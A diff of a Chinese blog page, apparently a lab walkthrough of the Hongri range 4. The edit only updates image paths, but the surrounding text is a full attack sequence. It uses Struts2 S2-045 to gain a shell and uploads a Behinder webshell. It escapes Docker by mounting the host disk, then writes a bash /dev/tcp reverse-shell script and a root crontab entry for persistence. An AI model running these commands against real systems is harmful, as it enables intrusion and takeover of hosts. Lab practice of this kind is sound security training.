@@ -372,22 +372,22 @@
 <p>启动docker环境:</p>
 <pre><code>sudo docker-compose up</code></pre><p>Struts2-045</p>
 <p>一把梭哈,反弹shell：</p>
-<p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20210930141754246.png" alt="image-20210930141754246"></p>
+<p><img src="/2021/09/30/红日靶场4/image-20210930141754246.png" alt="image-20210930141754246"></p>
 <p>呃。docker环境。</p>
 <p>先用工具传个冰蝎马:</p>
-<p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20210930142841156.png" alt="image-20210930142841156"></p>
+<p><img src="/2021/09/30/红日靶场4/image-20210930142841156.png" alt="image-20210930142841156"></p>
 <p>尝试docker逃逸漏洞:</p>
 <p>当docker容器内拥有宿主机文件读写权限时，可以通过写ssh密钥、计划任务等方式进行逃逸。</p>
 <pre><code>查看磁盘文件:fdisk -l</code></pre><p>呃。。s2-045这个好像没法。fdisk -l执行没反应。</p>
 <p>把tomcat环境也启动来:</p>
-<p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20210930144155271.png" alt="image-20210930144155271"></p>
+<p><img src="/2021/09/30/红日靶场4/image-20210930144155271.png" alt="image-20210930144155271"></p>
 <p>OK重新上冰蝎:</p>
-<pre><code>重新来:查看磁盘文件:fdisk -l</code></pre><p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20210930144309775.png" alt="image-20210930144309775"></p>
+<pre><code>重新来:查看磁盘文件:fdisk -l</code></pre><p><img src="/2021/09/30/红日靶场4/image-20210930144309775.png" alt="image-20210930144309775"></p>
 <p>这哈有了。</p>
 <p>然后是新建目录用来挂载文件:</p>
 <p>将宿主机/dev/sda1 目录挂载至容器内 /test: mount /dev/sda1 /test</p>
 <p>已经能获取宿主机的目录:</p>
-<p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20210930144734970.png" alt="image-20210930144734970"></p>
+<p><img src="/2021/09/30/红日靶场4/image-20210930144734970.png" alt="image-20210930144734970"></p>
 <p>然后就是写定时任务反弹shell脚本:</p>
 <pre><code>touch /test/tmp/test.sh
 chmod +x /test/tmp/test.sh
@@ -400,17 +400,17 @@ sed -i &#39;$a\/bin/bash -i  &gt;&amp;  bash -i &gt;&amp; /dev/tcp/192.168.32.12
 cat /test/tmp/test.sh
 写入定时任务:
 sed -i &#39;$a*/2 *    * * *    root  bash /tmp/test.sh &#39; /test/etc/crontab
-cat /test/etc/crontab</code></pre><p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20210930145341768.png" alt="image-20210930145341768"></p>
+cat /test/etc/crontab</code></pre><p><img src="/2021/09/30/红日靶场4/image-20210930145341768.png" alt="image-20210930145341768"></p>
 <p>这儿有个坑点，冰蝎的命令执行写不进去:</p>
 <p>我把shell弹到kali可以写:</p>
-<p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20210930152927577.png" alt="image-20210930152927577"></p>
-<p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20210930153051986.png" alt="image-20210930153051986"></p>
+<p><img src="/2021/09/30/红日靶场4/image-20210930152927577.png" alt="image-20210930152927577"></p>
+<p><img src="/2021/09/30/红日靶场4/image-20210930153051986.png" alt="image-20210930153051986"></p>
 <p>然后kali监听8888等shell：</p>
-<p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20210930153211941.png" alt="image-20210930153211941"></p>
+<p><img src="/2021/09/30/红日靶场4/image-20210930153211941.png" alt="image-20210930153211941"></p>
 <p>成了。逃逸出来了。</p>
-<p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20210930153300525.png" alt="image-20210930153300525"></p>
+<p><img src="/2021/09/30/红日靶场4/image-20210930153300525.png" alt="image-20210930153300525"></p>
 <p>这儿网卡没配置好，应该内网单独一个段。</p>
-<p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20210930164508737.png" alt="image-20210930164508737"></p>
+<p><img src="/2021/09/30/红日靶场4/image-20210930164508737.png" alt="image-20210930164508737"></p>
 <p>OK这哈对了</p>
 
         </div>
